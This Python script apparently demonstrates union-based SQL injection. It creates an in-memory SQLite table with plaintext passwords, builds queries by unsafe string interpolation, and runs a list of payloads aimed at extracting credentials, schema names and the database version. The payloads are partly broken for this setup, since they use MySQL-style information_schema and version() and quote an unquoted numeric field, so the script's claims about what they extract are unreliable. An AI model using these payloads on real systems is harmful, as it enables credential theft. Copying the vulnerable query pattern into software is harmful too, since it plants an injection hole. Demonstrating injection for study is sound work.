import sqlite3


conn = sqlite3.connect(':memory:')
cursor = conn.cursor()

# Create a sample users table with some data
cursor.execute('CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)')
cursor.execute("INSERT INTO users (username, password) VALUES ('admin', 'password123')")
cursor.execute("INSERT INTO users (username, password) VALUES ('guest', 'guest')")
conn.commit()


def vulnerable_query(input_payload):
    try:

        query = f"SELECT * FROM users WHERE id = {input_payload}"
        print(f"Executing Query: {query}")
        cursor.execute(query)
        result = cursor.fetchall()

        if result:
            return result
        else:
            return "No data found."
    except Exception as e:
        return f"Error: {e}"


payloads = [
    "1' UNION SELECT null, null, null--",                                                                  # Basic UNION query with null values
    "1' UNION SELECT username, password, null FROM users--",                                               # Extract data from 'users' table
    "1' UNION SELECT null, null, table_name FROM information_schema.tables--",                             # Extract table names
    "1' UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name='users'--",  # Extract column names from 'users' table
    "1' UNION SELECT null, null, version()--",                                                             # Extract database version
]


print("Testing Union-Based SQL Injection Payloads...\n")
for payload in payloads:
    result = vulnerable_query(payload)
    print(f"Payload: {payload}\nResult: {result}\n{'-'*50}")


conn.close()
